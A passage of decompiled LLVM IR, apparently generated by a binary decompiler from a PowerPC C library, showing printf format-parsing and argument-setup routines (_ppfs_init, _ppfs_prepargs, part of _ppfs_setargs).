  %stack_var_-184.2 = phi i32 [ %v0_100039e0, %dec_label_pc_100038b0 ], [ %stack_var_-184.1, %dec_label_pc_10003d70 ], [ %v0_100039e0, %dec_label_pc_10003ad8 ]
  %v3_10003d88 = load i8*, i8** %stack_var_-200, align 4
  %v4_10003d88 = ptrtoint i8* %v3_10003d88 to i32
  store i32 %v4_10003d88, i32* @r29, align 4
  br label %dec_label_pc_10003d8c

dec_label_pc_10003d8c:                            ; preds = %dec_label_pc_100037a8, %dec_label_pc_10003d88
  %v0_10003d8c = phi i32 [ %v0_10003d8c.pre, %dec_label_pc_100037a8 ], [ %v4_10003d88, %dec_label_pc_10003d88 ]
  %v0_100039e0 = phi i32 [ %tmp56, %dec_label_pc_100037a8 ], [ %stack_var_-184.2, %dec_label_pc_10003d88 ]
  br label %dec_label_pc_100037c0

dec_label_pc_10003d9c:                            ; preds = %dec_label_pc_10003bf4, %dec_label_pc_10003d70, %dec_label_pc_10003d00, %dec_label_pc_10003cac, %dec_label_pc_10003c90, %dec_label_pc_10003b50, %dec_label_pc_10003b20, %dec_label_pc_10003ab4, %dec_label_pc_100037fc, %dec_label_pc_10003d48
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10003da0

dec_label_pc_10003da0:                            ; preds = %dec_label_pc_10003808, %dec_label_pc_10003780, %dec_label_pc_10003798, %dec_label_pc_10003d9c
  store i32 %v0_10003754, i32* %r0.global-to-local, align 4
  %v0_10003da4 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_10003da4

; uselistorder directives
  uselistorder i32 %v0_100039e0, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_10003d18, { 2, 1, 0 }
  uselistorder i32 %v1_10003c7c, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_10003c0c, { 1, 0 }
  uselistorder i32 %v2_10003b9c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10003afc, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100039e0, { 1, 0 }
  uselistorder i32 %v6_10003998, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_10003968, { 1, 0 }
  uselistorder i32 %v1_1000390c, { 1, 0 }
  uselistorder i32 %v0_100038b4, { 1, 0, 2 }
  uselistorder i32 %v1_100038a0, { 1, 0 }
  uselistorder i32 %v0_10003898, { 1, 0 }
  uselistorder i32 %v1_10003894, { 1, 0 }
  uselistorder i32 %v1_10003814, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100037dc, { 1, 2, 3, 0 }
  uselistorder i32 %v0_100037ec, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10003c00, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v4_1000384c, { 1, 0 }
  uselistorder i32 %v2_10003848, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp60, { 1, 0 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 8, 7 }
  uselistorder i32* %r10.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 0, 36, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 4, 5, 3 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 1, 0, 2, 3, 6, 5, 7, 4, 10, 9, 8, 11, 12 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_10003da0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10003d9c, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10003d8c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d70, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10003d48, { 1, 0 }
  uselistorder label %dec_label_pc_10003cac, { 1, 0 }
  uselistorder label %dec_label_pc_10003c84, { 1, 0 }
  uselistorder label %dec_label_pc_10003c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10003c58, { 1, 0 }
  uselistorder label %dec_label_pc_10003c38, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10003c38thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10003c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10003bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10003ba8, { 1, 0 }
  uselistorder label %dec_label_pc_10003b20, { 1, 0 }
  uselistorder label %dec_label_pc_10003a70, { 1, 0 }
  uselistorder label %dec_label_pc_10003a58, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_10003a08, { 1, 0 }
  uselistorder label %dec_label_pc_100039ec, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10003978, { 1, 0 }
  uselistorder label %dec_label_pc_1000395c, { 1, 0 }
  uselistorder label %dec_label_pc_10003948, { 1, 0 }
  uselistorder label %dec_label_pc_10003944, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10003918, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100038a4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10003868, { 1, 0 }
  uselistorder label %dec_label_pc_10003808, { 1, 0 }
  uselistorder label %dec_label_pc_100037fc, { 1, 0 }
  uselistorder label %dec_label_pc_100037c0, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10003dbc = load i32, i32* @lr, align 4
  store i32 %v0_10003dbc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10003dcc = load i32, i32* @r4, align 4
  store i32 %v0_10003dcc, i32* @r30, align 4
  store i32 268451292, i32* @lr, align 4
  %v3_10003dd8 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_10003ddc = load i32, i32* @r31, align 4
  %v1_10003ddc = add i32 %v0_10003ddc, 24
  %v2_10003ddc = inttoptr i32 %v1_10003ddc to i32*
  %v3_10003ddc = load i32, i32* %v2_10003ddc, align 4
  store i32 %v3_10003ddc, i32* %r9.global-to-local, align 4
  %v1_10003de0 = add i32 %v0_10003ddc, 40
  store i32 %v1_10003de0, i32* %r11.global-to-local, align 4
  %v0_10003de4 = load i32, i32* @r30, align 4
  %v2_10003de4 = inttoptr i32 %v0_10003ddc to i32*
  store i32 %v0_10003de4, i32* %v2_10003de4, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v0_10003dec = load i32, i32* %r9.global-to-local, align 4
  %v1_10003dec = add i32 %v0_10003dec, -1
  %v1_10003df0 = load i32, i32* @r31, align 4
  %v2_10003df0 = add i32 %v1_10003df0, 24
  %v3_10003df0 = inttoptr i32 %v2_10003df0 to i32*
  store i32 %v1_10003dec, i32* %v3_10003df0, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v1_10003dfc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10003dfc

dec_label_pc_10003dfc:                            ; preds = %dec_label_pc_10003dfc, %entry
  %v1_10003dfc = phi i32 [ %v1_10003e00, %dec_label_pc_10003dfc ], [ %v1_10003dfc.pre, %entry ]
  %v0_10003dfc = load i32, i32* %r0.global-to-local, align 4
  %v2_10003dfc = inttoptr i32 %v1_10003dfc to i32*
  store i32 %v0_10003dfc, i32* %v2_10003dfc, align 4
  %v0_10003e00 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003e00 = add i32 %v0_10003e00, 4
  store i32 %v1_10003e00, i32* %r11.global-to-local, align 4
  %v0_10003e04 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10003e04 = add i32 %v0_10003e04, -1
  store i32 %v1_10003e04, i32* %ctr.global-to-local, align 4
  %v2_10003e04 = icmp eq i32 %v1_10003e04, 0
  br i1 %v2_10003e04, label %dec_label_pc_10003e08, label %dec_label_pc_10003dfc

dec_label_pc_10003e08:                            ; preds = %dec_label_pc_10003dfc
  %v0_10003e08 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10003e48

dec_label_pc_10003e18:                            ; preds = %dec_label_pc_10003e48
  %v3_10003e50 = icmp eq i8 %v2_10003e48, 37
  br i1 %v3_10003e50, label %dec_label_pc_10003e1c, label %dec_label_pc_10003e44

dec_label_pc_10003e1c:                            ; preds = %dec_label_pc_10003e18
  %v1_10003e1c = add i32 %v0_10003e1c, 1
  %v2_10003e1c = inttoptr i32 %v1_10003e1c to i8*
  %v3_10003e1c = load i8, i8* %v2_10003e1c, align 1
  %v4_10003e1c = zext i8 %v3_10003e1c to i32
  store i32 %v4_10003e1c, i32* %r0.global-to-local, align 4
  store i32 %v1_10003e1c, i32* %r9.global-to-local, align 4
  %v3_10003e24 = icmp eq i8 %v3_10003e1c, 37
  br i1 %v3_10003e24, label %dec_label_pc_10003e44, label %dec_label_pc_10003e2c

dec_label_pc_10003e2c:                            ; preds = %dec_label_pc_10003e1c
  %v0_10003e20 = load i32, i32* @r31, align 4
  %v2_10003e2c = inttoptr i32 %v0_10003e20 to i32*
  store i32 %v1_10003e1c, i32* %v2_10003e2c, align 4
  store i32 268451380, i32* @lr, align 4
  %v1_10003e30 = load i32, i32* %r9.global-to-local, align 4
  %v3_10003e30 = call i32 @_ppfs_parsespec(i32* %v2_10003e2c, i32 %v1_10003e30)
  %v1_10003e34 = icmp slt i32 %v3_10003e30, 0
  br i1 %v1_10003e34, label %dec_label_pc_10003e60, label %dec_label_pc_10003e3c

dec_label_pc_10003e3c:                            ; preds = %dec_label_pc_10003e2c
  %v0_10003e3c = load i32, i32* @r31, align 4
  %v1_10003e3c = inttoptr i32 %v0_10003e3c to i32*
  %v2_10003e3c = load i32, i32* %v1_10003e3c, align 4
  br label %dec_label_pc_10003e48

dec_label_pc_10003e44:                            ; preds = %dec_label_pc_10003e18, %dec_label_pc_10003e1c
  %v0_10003e44 = phi i32 [ %v0_10003e1c, %dec_label_pc_10003e18 ], [ %v1_10003e1c, %dec_label_pc_10003e1c ]
  %v1_10003e44 = add i32 %v0_10003e44, 1
  br label %dec_label_pc_10003e48

dec_label_pc_10003e48:                            ; preds = %dec_label_pc_10003e3c, %dec_label_pc_10003e44, %dec_label_pc_10003e08
  %v0_10003e1c = phi i32 [ %v0_10003e08, %dec_label_pc_10003e08 ], [ %v1_10003e44, %dec_label_pc_10003e44 ], [ %v2_10003e3c, %dec_label_pc_10003e3c ]
  store i32 %v0_10003e1c, i32* %r9.global-to-local, align 4
  %v1_10003e48 = inttoptr i32 %v0_10003e1c to i8*
  %v2_10003e48 = load i8, i8* %v1_10003e48, align 1
  %v3_10003e48 = zext i8 %v2_10003e48 to i32
  store i32 %v3_10003e48, i32* %r0.global-to-local, align 4
  %v3_10003e4c = icmp eq i8 %v2_10003e48, 0
  br i1 %v3_10003e4c, label %dec_label_pc_10003e58, label %dec_label_pc_10003e18

dec_label_pc_10003e58:                            ; preds = %dec_label_pc_10003e48
  %v0_10003e58 = load i32, i32* @r30, align 4
  %v1_10003e58 = load i32, i32* @r31, align 4
  %v2_10003e58 = inttoptr i32 %v1_10003e58 to i32*
  store i32 %v0_10003e58, i32* %v2_10003e58, align 4
  br label %dec_label_pc_10003e60

dec_label_pc_10003e60:                            ; preds = %dec_label_pc_10003e2c, %dec_label_pc_10003e58
  %storemerge = phi i32 [ 0, %dec_label_pc_10003e58 ], [ -1, %dec_label_pc_10003e2c ]
  store i32 %v0_10003dbc, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_10003e48, { 1, 2, 0 }
  uselistorder i32 %v0_10003e1c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10003e04, { 1, 0 }
  uselistorder i32 %v1_10003e00, { 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_10003e60, { 1, 0 }
  uselistorder label %dec_label_pc_10003e48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003e44, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10003e78 = load i32, i32* @lr, align 4
  %v0_10003e7c = load i32, i32* @r3, align 4
  store i32 %v0_10003e7c, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10003e98 = add i32 %v0_10003e7c, 24
  %v2_10003e98 = inttoptr i32 %v1_10003e98 to i32*
  %v3_10003e98 = load i32, i32* %v2_10003e98, align 4
  store i32 %v3_10003e98, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_10003e98, 1
  br i1 %tmp4, label %dec_label_pc_10003ebc, label %dec_label_pc_10003ea4

dec_label_pc_10003ea4:                            ; preds = %entry
  %v2_10003ea4 = add i32 %v0_10003e7c, 8
  %v3_10003ea4 = inttoptr i32 %v2_10003ea4 to i32*
  store i32 0, i32* %v3_10003ea4, align 4
  %v0_10003ea8 = load i32, i32* @r30, align 4
  %v1_10003ea8 = load i32, i32* @r3, align 4
  %v2_10003ea8 = add i32 %v1_10003ea8, 28
  %v3_10003ea8 = inttoptr i32 %v2_10003ea8 to i32*
  store i32 %v0_10003ea8, i32* %v3_10003ea8, align 4
  %v0_10003eac = load i32, i32* %r0.global-to-local, align 4
  %v1_10003eac = load i32, i32* @r3, align 4
  %v2_10003eac = add i32 %v1_10003eac, 24
  %v3_10003eac = inttoptr i32 %v2_10003eac to i32*
  store i32 %v0_10003eac, i32* %v3_10003eac, align 4
  %v0_10003eb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003eb0 = load i32, i32* @r3, align 4
  %v2_10003eb0 = add i32 %v1_10003eb0, 4
  %v3_10003eb0 = inttoptr i32 %v2_10003eb0 to i32*
  store i32 %v0_10003eb0, i32* %v3_10003eb0, align 4
  store i32 268451512, i32* @lr, align 4
  %v0_10003eb4 = call i32 @_ppfs_setargs()
  store i32 %v0_10003eb4, i32* %r3.global-to-local, align 4
  %v0_10003eb8 = load i32, i32* @r30, align 4
  %v1_10003eb8 = load i32, i32* @r31, align 4
  %v2_10003eb8 = add i32 %v1_10003eb8, 24
  %v3_10003eb8 = inttoptr i32 %v2_10003eb8 to i32*
  store i32 %v0_10003eb8, i32* %v3_10003eb8, align 4
  %v0_10003ecc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003ebc

dec_label_pc_10003ebc:                            ; preds = %entry, %dec_label_pc_10003ea4
  %v0_10003ecc = phi i32 [ %v0_10003e7c, %entry ], [ %v0_10003ecc.pre, %dec_label_pc_10003ea4 ]
  store i32 %v0_10003e78, i32* %r0.global-to-local, align 4
  ret i32 %v0_10003ecc

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_10003ebc, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10003ed0 = load i32, i32* @r3, align 4
  %v1_10003ed0 = add i32 %v0_10003ed0, 24
  %v2_10003ed0 = inttoptr i32 %v1_10003ed0 to i32*
  %v3_10003ed0 = load i32, i32* %v2_10003ed0, align 4
  store i32 %v3_10003ed0, i32* %r0.global-to-local, align 4
  %v1_10003ed4 = add i32 %v0_10003ed0, 88
  store i32 %v1_10003ed4, i32* %r8.global-to-local, align 4
  %v1_10003ed8 = add i32 %v0_10003ed0, 8
  %v2_10003ed8 = inttoptr i32 %v1_10003ed8 to i32*
  %v3_10003ed8 = load i32, i32* %v2_10003ed8, align 4
  store i32 %v3_10003ed8, i32* %r9.global-to-local, align 4
  %v2_10003edc = icmp sgt i32 %v3_10003ed0, 0
  %v3_10003edc = icmp eq i32 %v3_10003ed0, 0
  store i1 %v2_10003edc, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10003edc, label %dec_label_pc_10003ee4, label %dec_label_pc_100040d0

dec_label_pc_10003ee4:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_10003ee8 = icmp ne i32 %v3_10003ed8, -2147483648
  %v4_10003ee8 = icmp eq i32 %v3_10003ed8, -2147483648
  store i1 %v3_10003ee8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10003ee8, label %dec_label_pc_10003ef0, label %dec_label_pc_10003f30

dec_label_pc_10003ef0:                            ; preds = %dec_label_pc_10003ee4
  %v1_10003ef0 = add i32 %v0_10003ed0, 76
  %v2_10003ef0 = inttoptr i32 %v1_10003ef0 to i8*
  %v3_10003ef0 = load i8, i8* %v2_10003ef0, align 1
  %v4_10003ef0 = zext i8 %v3_10003ef0 to i32
  store i32 %v4_10003ef0, i32* %r11.global-to-local, align 4
  store i32 %v1_10003ef0, i32* %r10.global-to-local, align 4
  %v2_10003ef8 = icmp ugt i8 %v3_10003ef0, 8
  store i1 %v2_10003ef8, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_10003ef0, 7
  br i1 %tmp, label %dec_label_pc_10003f18, label %dec_label_pc_10003f00

dec_label_pc_10003f00:                            ; preds = %dec_label_pc_10003ef0
  %v1_10003f00 = add i32 %v0_10003ed0, 84
  %v2_10003f00 = inttoptr i32 %v1_10003f00 to i32*
  %v3_10003f00 = load i32, i32* %v2_10003f00, align 4
  store i32 %v3_10003f00, i32* %r0.global-to-local, align 4
  %v1_10003f04 = mul nuw nsw i32 %v4_10003ef0, 4
  store i32 %v1_10003f04, i32* %r9.global-to-local, align 4
  %v1_10003f08 = add nuw nsw i32 %v4_10003ef0, 1
  store i32 %v1_10003f08, i32* %r11.global-to-local, align 4
  %v1_10003f0c = trunc i32 %v1_10003f08 to i8
  store i8 %v1_10003f0c, i8* %v2_10003ef0, align 1
  %v0_10003f10 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003f10 = load i32, i32* %r0.global-to-local, align 4
  %v2_10003f10 = add i32 %v1_10003f10, %v0_10003f10
  store i32 %v2_10003f10, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10003f24

dec_label_pc_10003f18:                            ; preds = %dec_label_pc_10003ef0
  %v1_10003f18 = add i32 %v0_10003ed0, 80
  %v2_10003f18 = inttoptr i32 %v1_10003f18 to i32*
  %v3_10003f18 = load i32, i32* %v2_10003f18, align 4
  store i32 %v3_10003f18, i32* %r9.global-to-local, align 4
  %v1_10003f1c = add i32 %v3_10003f18, 4
  store i32 %v1_10003f1c, i32* %r0.global-to-local, align 4
  store i32 %v1_10003f1c, i32* %v2_10003f18, align 4
  %v0_10003f24.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10003f24

dec_label_pc_10003f24:                            ; preds = %dec_label_pc_10003f00, %dec_label_pc_10003f18
  %v0_10003f24 = phi i32 [ %v2_10003f10, %dec_label_pc_10003f00 ], [ %v0_10003f24.pre, %dec_label_pc_10003f18 ]
  %v1_10003f24 = inttoptr i32 %v0_10003f24 to i32*
  %v2_10003f24 = load i32, i32* %v1_10003f24, align 4
  store i32 %v2_10003f24, i32* %r0.global-to-local, align 4
  %v1_10003f28 = load i32, i32* %r8.global-to-local, align 4
  %v2_10003f28 = inttoptr i32 %v1_10003f28 to i32*
  store i32 %v2_10003f24, i32* %v2_10003f28, align 4
  %v0_10003f2c = load i32, i32* %r0.global-to-local, align 4
  %v1_10003f2c = load i32, i32* @r3, align 4
  %v2_10003f2c = add i32 %v1_10003f2c, 8
  %v3_10003f2c = inttoptr i32 %v2_10003f2c to i32*
  store i32 %v0_10003f2c, i32* %v3_10003f2c, align 4
  %v0_10003f30.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10003f30

dec_label_pc_10003f30:                            ; preds = %dec_label_pc_10003ee4, %dec_label_pc_10003f24
  %v2_10003f5c = phi i32 [ %v0_10003ed0, %dec_label_pc_10003ee4 ], [ %v0_10003f30.pre, %dec_label_pc_10003f24 ]
  %v1_10003f30 = add i32 %v2_10003f5c, 4
  %v2_10003f30 = inttoptr i32 %v1_10003f30 to i32*
  %v3_10003f30 = load i32, i32* %v2_10003f30, align 4
  store i32 %v3_10003f30, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_10003f38 = icmp ne i32 %v3_10003f30, -2147483648
  %v4_10003f38 = icmp eq i32 %v3_10003f30, -2147483648
  store i1 %v3_10003f38, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10003f38, label %dec_label_pc_10003f40, label %dec_label_pc_100040c0.preheader

dec_label_pc_10003f40:                            ; preds = %dec_label_pc_10003f30
  %v1_10003f40 = add i32 %v2_10003f5c, 76
  %v2_10003f40 = inttoptr i32 %v1_10003f40 to i8*
  %v3_10003f40 = load i8, i8* %v2_10003f40, align 1
  %v4_10003f40 = zext i8 %v3_10003f40 to i32
  store i32 %v4_10003f40, i32* %r11.global-to-local, align 4
  store i32 %v1_10003f40, i32* %r10.global-to-local, align 4
  %v2_10003f48 = icmp ugt i8 %v3_10003f40, 8
  store i1 %v2_10003f48, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_10003f40, 7
  br i1 %tmp26, label %dec_label_pc_10003f68, label %dec_label_pc_10003f50

dec_label_pc_10003f50:                            ; preds = %dec_label_pc_10003f40
  %v1_10003f50 = add i32 %v2_10003f5c, 84
  %v2_10003f50 = inttoptr i32 %v1_10003f50 to i32*
  %v3_10003f50 = load i32, i32* %v2_10003f50, align 4
  store i32 %v3_10003f50, i32* %r0.global-to-local, align 4
  %v1_10003f54 = mul nuw nsw i32 %v4_10003f40, 4
  store i32 %v1_10003f54, i32* %r9.global-to-local, align 4
  %v1_10003f58 = add nuw nsw i32 %v4_10003f40, 1
  store i32 %v1_10003f58, i32* %r11.global-to-local, align 4
  %v1_10003f5c = trunc i32 %v1_10003f58 to i8
  store i8 %v1_10003f5c, i8* %v2_10003f40, align 1
  %v0_10003f60 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003f60 = load i32, i32* %r0.global-to-local, align 4
  %v2_10003f60 = add i32 %v1_10003f60, %v0_10003f60
  store i32 %v2_10003f60, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10003f74

dec_label_pc_10003f68:                            ; preds = %dec_label_pc_10003f40
  %v1_10003f68 = add i32 %v2_10003f5c, 80
  %v2_10003f68 = inttoptr i32 %v1_10003f68 to i32*
  %v3_10003f68 = load i32, i32* %v2_10003f68, align 4
  store i32 %v3_10003f68, i32* %r9.global-to-local, align 4
  %v1_10003f6c = add i32 %v3_10003f68, 4
  store i32 %v1_10003f6c, i32* %r0.global-to-local, align 4
  store i32 %v1_10003f6c, i32* %v2_10003f68, align 4
  %v0_10003f74.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10003f74

dec_label_pc_10003f74:                            ; preds = %dec_label_pc_10003f50, %dec_label_pc_10003f68
  %v0_10003f74 = phi i32 [ %v2_10003f60, %dec_label_pc_10003f50 ], [ %v0_10003f74.pre, %dec_label_pc_10003f68 ]
  %v1_10003f74 = inttoptr i32 %v0_10003f74 to i32*
  %v2_10003f74 = load i32, i32* %v1_10003f74, align 4
  store i32 %v2_10003f74, i32* %r0.global-to-local, align 4
  %v1_10003f78 = load i32, i32* %r8.global-to-local, align 4
  %v2_10003f78 = inttoptr i32 %v1_10003f78 to i32*
  store i32 %v2_10003f74, i32* %v2_10003f78, align 4
  %v0_10003f7c = load i32, i32* %r0.global-to-local, align 4
  %v1_10003f7c = load i32, i32* @r3, align 4
  %v2_10003f7c = add i32 %v1_10003f7c, 4
  %v3_10003f7c = inttoptr i32 %v2_10003f7c to i32*
  store i32 %v0_10003f7c, i32* %v3_10003f7c, align 4
  %v0_100040c05.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100040c0.preheader

dec_label_pc_100040c0.preheader:                  ; preds = %dec_label_pc_10003f30, %dec_label_pc_10003f74
  %v0_100040c05 = phi i32 [ %v2_10003f5c, %dec_label_pc_10003f30 ], [ %v0_100040c05.pre, %dec_label_pc_10003f74 ]
  store i32 0, i32* @r7, align 4
  %v1_100040c06 = add i32 %v0_100040c05, 28
  %v2_100040c07 = inttoptr i32 %v1_100040c06 to i32*
  %v3_100040c08 = load i32, i32* %v2_100040c07, align 4
  store i32 %v3_100040c08, i32* %r0.global-to-local, align 4
  %v2_100040c49 = icmp sgt i32 %v3_100040c08, 0
  %v3_100040c410 = icmp slt i32 %v3_100040c08, 0
  store i1 %v3_100040c410, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100040c49, label %dec_label_pc_10003f88, label %dec_label_pc_10004110

dec_label_pc_10003f88:                            ; preds = %dec_label_pc_100040c0.preheader, %dec_label_pc_100040bc
  %v2_10004098 = phi i32 [ %v0_100040c0, %dec_label_pc_100040bc ], [ %v0_100040c05, %dec_label_pc_100040c0.preheader ]
  %v0_10003f88 = phi i32 [ %v1_100040bc, %dec_label_pc_100040bc ], [ 0, %dec_label_pc_100040c0.preheader ]
  %v1_10003f88 = mul i32 %v0_10003f88, 4
  %v2_10003f8c = add i32 %v1_10003f88, %v2_10004098
  store i32 %v2_10003f8c, i32* %r9.global-to-local, align 4
  %v1_10003f90 = add i32 %v2_10003f8c, 40
  %v2_10003f90 = inttoptr i32 %v1_10003f90 to i32*
  %v3_10003f90 = load i32, i32* %v2_10003f90, align 4
  store i32 %v3_10003f90, i32* %r0.global-to-local, align 4
  %v2_10003f94 = icmp sgt i32 %v3_10003f90, 8
  %v3_10003f94 = icmp eq i32 %v3_10003f90, 8
  store i1 %v2_10003f94, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10003f94, label %dec_label_pc_100040bc, label %dec_label_pc_10003f9c

dec_label_pc_10003f9c:                            ; preds = %dec_label_pc_10003f88
  %v1_10003f9c = add i32 %v2_10004098, 76
  store i32 %v1_10003f9c, i32* %r10.global-to-local, align 4
  br i1 %v2_10003f94, label %dec_label_pc_10003fb8, label %dec_label_pc_10003fa4

dec_label_pc_10003fa4:                            ; preds = %dec_label_pc_10003f9c
  %v2_10003fa4 = icmp sgt i32 %v3_10003f90, 2
  store i1 %v2_10003fa4, i1* %cr7_gt.global-to-local, align 1
  %tmp27 = icmp slt i32 %v3_10003f90, 3
  br i1 %tmp27, label %dec_label_pc_10004080, label %dec_label_pc_10003fd0

dec_label_pc_10003fb8:                            ; preds = %dec_label_pc_10003f9c
  %v2_10003fb8 = icmp sgt i32 %v3_10003f90, 1024
  store i1 %v2_10003fb8, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = icmp slt i32 %v3_10003f90, 1025
  br i1 %tmp28, label %dec_label_pc_10004080, label %dec_label_pc_10003fc4

dec_label_pc_10003fc4:                            ; preds = %dec_label_pc_10003fb8
  %v2_10003fc4 = icmp sgt i32 %v3_10003f90, 2048
  %v3_10003fc4 = icmp eq i32 %v3_10003f90, 2048
  store i1 %v2_10003fc4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10003fc4, label %dec_label_pc_10003fd8, label %dec_label_pc_10003fcc

dec_label_pc_10003fcc:                            ; preds = %dec_label_pc_10003fc4
  %v2_10003fcc = icmp sgt i32 %v3_10003f90, 2055
  %v3_10003fcc = icmp eq i32 %v3_10003f90, 2055
  store i1 %v2_10003fcc, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10003fcc, label %dec_label_pc_10004034, label %dec_label_pc_10004080

dec_label_pc_10003fd0:                            ; preds = %dec_label_pc_10003fa4
  %v3_10003fb0 = icmp eq i32 %v3_10003f90, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10003fb0, label %dec_label_pc_10004034, label %dec_label_pc_10004080

dec_label_pc_10003fd8:                            ; preds = %dec_label_pc_10003fc4
  %v2_10003fd8 = inttoptr i32 %v1_10003f9c to i8*
